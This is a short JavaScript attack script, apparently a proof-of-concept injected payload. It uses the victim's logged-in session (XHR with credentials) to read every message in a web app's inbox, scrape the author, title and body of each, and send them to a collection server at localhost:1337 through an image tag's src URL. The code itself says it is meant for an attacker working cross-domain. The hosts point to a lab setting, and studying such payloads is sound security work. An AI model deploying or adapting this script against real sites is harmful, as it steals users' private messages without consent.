// Compatible XHR object with credentials enabled.
function newHttp(){
    http = window.XMLHttpRequest? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
    http.withCredentials = true;
    return http
}
// Generates a DOM-like, queriable thing out of html text
function DOM(html){
    var c = document.createElement('span');
    c.innerHTML = html; 
    return c
}
// Sends all the messages we found in the url of a get request
// We can't use an XHR object due to CORS policies. (and attacker will probably need to send this cross-domain)
// We'll add a <img> tag with the right src
function send_msgs(){
    var u = 'http://localhost:1337/'+encodeURIComponent(JSON.stringify(msgs,2,2));
    var s = document.createElement('img');
    s.src = u;
    document.getElementsByTagName('body')[0].appendChild(s);
}


msgs = [];
done = 0;
var http = newHttp();
http.onreadystatechange = function() {
    if (this.readyState == 4) {
        
        msg_tags = DOM(this.responseText)
                        .getElementsByTagName('tbody')[0]
                        .getElementsByTagName('tr');
        
        for (var i=0;i<msg_tags.length;i++){
            fetch_message(i);
        }

        
    };
}

http.open('GET', 'http://localhost:8080/user/messages/inbox', true); 
http.send();

function fetch_message(i){
    var tag = msg_tags[i];
            msgs[i] = {};
            // 
            msgs[i]['author'] = tag.getElementsByTagName('a')[0].text;
            msgs[i]['title'] = tag.getElementsByTagName('a')[1].text.replace(/\s\s/g,'');
            // The message's content is in another page
            var contentUrl = tag.getElementsByTagName('a')[1].href ;
            // we'll start an ajax request
            var http = newHttp();
            http.num = i;
            http.onreadystatechange = function() {
                if (this.readyState == 4) {
                    msgs[this.num]['content'] = DOM(this.responseText)
                                                    .getElementsByClassName('message_body')[0]
                                                    .innerHTML
                                                    .replace(/\s\s/g,'') ;                   
                    //we have one more
                    done ++;
                    // If we have all of them
                    if (done == msg_tags.length){
                       send_msgs();
                    }
                }
            };
            http.open('GET', contentUrl, true); 
            http.send();
}